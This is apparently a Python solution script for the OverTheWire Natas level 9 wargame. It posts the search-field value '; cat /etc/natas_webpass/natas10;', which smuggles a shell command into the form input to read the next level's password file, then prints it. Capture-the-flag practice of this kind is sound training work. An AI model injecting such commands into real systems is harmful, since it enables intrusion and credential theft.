#!/usr/bin/python3

import requests
import re
import os

username = 'natas9'
password = os.getenv("natas_pass")


url = "http://{0}.natas.labs.overthewire.org/".format(username)

auth=(username,password)

proxies={'http':'http://127.0.0.1:8080'}
data={'needle':'; cat /etc/natas_webpass/natas10;' , 'submit':'Search'}

response1 = requests.post(url, auth=auth,data=data)
flag = re.findall("<pre>\n(.*)",response1.text)[0]
print(flag)